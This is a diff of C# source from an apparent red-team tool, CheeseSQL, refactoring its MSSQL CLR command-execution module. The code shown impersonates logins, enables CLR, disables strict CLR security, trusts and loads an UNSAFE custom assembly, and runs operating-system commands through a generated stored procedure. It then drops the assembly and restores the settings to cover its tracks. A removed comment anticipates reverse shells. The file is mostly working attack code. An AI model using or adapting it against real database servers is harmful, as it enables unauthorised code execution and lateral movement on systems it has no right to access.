@@ -3,8 +3,6 @@ using System;
 using System.Collections.Generic;
 using System.Data.SqlClient;
 using System.IO;
-using System.Linq;
-using System.Net;
 
 namespace CheeseSQL.Commands
 {
@@ -42,14 +40,11 @@ namespace CheeseSQL.Commands
             string clazz = "";
             string cmd = "";
             string method = "";
-            string user = "";
-            string password = "";
             string connectInfo = "";
             string impersonate = "";
             bool compile = false;
 
             bool sqlauth = false;
-            bool brokenConnection = false;
 
             if (arguments.ContainsKey("/sqlauth"))
             {
@@ -121,152 +116,49 @@ namespace CheeseSQL.Commands
                 method = StringUtils.RandomString(10);
             }
 
-            if (sqlauth)
+            SqlConnection connection;
+            SQLExecutor.ConnectionInfo(arguments, connectserver, database, sqlauth, out connectInfo);
+            if (String.IsNullOrEmpty(connectInfo))
             {
-                if (arguments.ContainsKey("/user"))
-                {
-                    user = arguments["/user"];
-                }
-                if (arguments.ContainsKey("/password"))
-                {
-                    password = arguments["/password"];
-                }
-                if (String.IsNullOrEmpty(user))
-                {
-                    Console.WriteLine("\r\n[X] You must supply the SQL account user!\r\n");
-                    return;
-                }
-                if (String.IsNullOrEmpty(password))
-                {
-                    Console.WriteLine("\r\n[X] You must supply the SQL account password!\r\n");
-                    return;
-                }
-                connectInfo = "Data Source= " + connectserver + "; Initial Catalog= " + database + "; User ID=" + user + "; Password=" + password;
-            }
-            else
-            {
-                connectInfo = "Server = " + connectserver + "; Database = " + database + "; Integrated Security = True;";
-            }
-
-            SqlConnection connection = new SqlConnection(connectInfo);
-
-            try
-            {
-                connection.Open();
-                Console.WriteLine($"[+] Authentication to the '{database}' Database on '{connectserver}' Successful!");
-            }
-            catch
-            {
-                Console.WriteLine($"[-] Authentication to the '{database}' Database on '{connectserver}' Failed.");
                 return;
             }
-
-            SqlCommand command;
-            SqlDataReader reader;
+            if (!SQLExecutor.Authenticate(connectInfo, out connection))
+            {
+                return;
+            }
 
             Console.WriteLine("[*] Loading assembly..");
 
             string hash;
             string hexData = AssemblyLoader.LoadAssembly(assembly, out hash, clazz, method, compile);
 
+            var procedures = new Dictionary<string, string>();
+
             if (!String.IsNullOrEmpty(impersonate))
             {
-                string execAs = $"EXECUTE AS LOGIN = '{impersonate}';";
-                command = new SqlCommand(execAs, connection);
-                reader = command.ExecuteReader();
-                reader.Read();
-                Console.WriteLine("[*] Attempting impersonation as {0}..", impersonate);
-                reader.Close();
+                procedures.Add($"Attempting impersonation as {impersonate}..", $"EXECUTE AS LOGIN = '{impersonate}';");
             }
 
-            Console.WriteLine("[*] Enabling CLR..");
-            string enableCLR = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'clr enabled', 1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE;";
-            command = new SqlCommand(enableCLR, connection);
-            Console.WriteLine("[*] Disabling CLR Security..");
-            reader = command.ExecuteReader();
-            reader.Read();
-            reader.Close();
+            procedures.Add("Enabling advanced options..", $"sp_configure 'show advanced options', 1; RECONFIGURE;");
+            procedures.Add("Enabling 'clr enabled'..", $"sp_configure 'clr enabled', 1; RECONFIGURE;");
+            procedures.Add("Enabling 'clr strict security'..", $"sp_configure 'clr strict security', 0; RECONFIGURE;");
+            procedures.Add("Adding assembly to trusted list..", $"sp_add_trusted_assembly @hash={hash};");
+            procedures.Add($"Creating assembly [{assembly}]..", $"CREATE ASSEMBLY [{assembly}] FROM {hexData} WITH PERMISSION_SET = UNSAFE;");
+            procedures.Add($"Creating procedure [{assembly}].[{clazz}].[{method}]..", $"CREATE PROCEDURE [dbo].[{method}] @command NVARCHAR (4000) AS EXTERNAL NAME [{assembly}].[{clazz}].[{method}];");
 
-            Console.WriteLine("[*] Creating assembly {0}..", assembly);
+            procedures.Add("Executing command..", $"{method} '{cmd}';");
 
-            string execCmd = $"CREATE ASSEMBLY {assembly} FROM {hexData} WITH PERMISSION_SET = UNSAFE;";
-            command = new SqlCommand(execCmd, connection);
-            reader = command.ExecuteReader();
-            reader.Read();
-            reader.Close();
+            procedures.Add("Dropping procedure..", $"DROP PROCEDURE [dbo].[{method}];");
+            procedures.Add("Dropping assembly..", $"DROP ASSEMBLY [{assembly}];");
+            procedures.Add("Removing assembly from trusted list..", $"sp_drop_trusted_assembly @hash={hash};");
+            procedures.Add("Restoring CLR strict security'..", $"sp_configure 'clr strict security', 1; RECONFIGURE;");
+            procedures.Add("Disabling CLR..", $"sp_configure 'clr enabled', 0; RECONFIGURE;");
 
-            Console.WriteLine("[*] Creating procedure [{0}].[{1}].[{2}]..", assembly, clazz, method);
-
-            execCmd = $"CREATE PROCEDURE [dbo].[{method}] @command NVARCHAR (4000) AS EXTERNAL NAME [{assembly}].[{clazz}].[{method}];";
-            command = new SqlCommand(execCmd, connection);
-            reader = command.ExecuteReader();
-            reader.Read();
-            reader.Close();
-
-            try
+            foreach (string step in procedures.Keys)
             {
-                Console.WriteLine("[*] Executing command..");
-                execCmd = $"EXEC {method} '{cmd}';";
-                command = new SqlCommand(execCmd, connection);
-                using (reader = command.ExecuteReader())
-                {
-                    try
-                    {
-                        reader.Read();
-                        Console.WriteLine("[+] Command result: " + reader[0]);
-                    }
-                    catch { }
-                }
+                Console.WriteLine("[*] {0}", step);
+                SQLExecutor.ExecuteProcedure(connection, procedures[step]);
             }
-            catch (SqlException e)
-            {
-                if (e.Message.Contains("Execution Timeout Expired"))
-                {
-                    Console.WriteLine("[*] The SQL Query hit the timeout. If you were executing a reverse shell, this is expected");
-                    brokenConnection = true;
-                }
-                else
-                {
-                    Console.WriteLine($"[-] Exception: {e.Message}");
-                    return;
-                }
-            }
-
-            execCmd = $"DROP PROCEDURE [dbo].[{method}];";
-            if (brokenConnection)
-            {
-                connection = new SqlConnection(connectInfo);
-                connection.Open();
-
-                if (!String.IsNullOrEmpty(impersonate))
-                {
-                    string execAs = $"EXECUTE AS LOGIN = '{impersonate}';";
-                    command = new SqlCommand(execAs, connection);
-                    reader = command.ExecuteReader();
-                    reader.Read();
-                    reader.Close();
-                }
-            }
-
-            command = new SqlCommand(execCmd, connection);
-            reader = command.ExecuteReader();
-            reader.Read();
-            reader.Close();
-
-            execCmd = $"DROP ASSEMBLY {assembly};";
-            command = new SqlCommand(execCmd, connection);
-            reader = command.ExecuteReader();
-            reader.Read();
-            reader.Close();
-
-
-            Console.WriteLine("[*] Restoring CLR Security..");
-            string disableOle = "EXEC sp_configure 'clr strict security', 1; RECONFIGURE; EXEC sp_configure 'clr enabled', 0; RECONFIGURE; EXEC sp_configure 'show advanced options', 0; RECONFIGURE;";
-            command = new SqlCommand(disableOle, connection);
-            reader = command.ExecuteReader();
-            reader.Read();
-            Console.WriteLine("[*] Disabling CLR..");
-            reader.Close();
 
             connection.Close();
         }
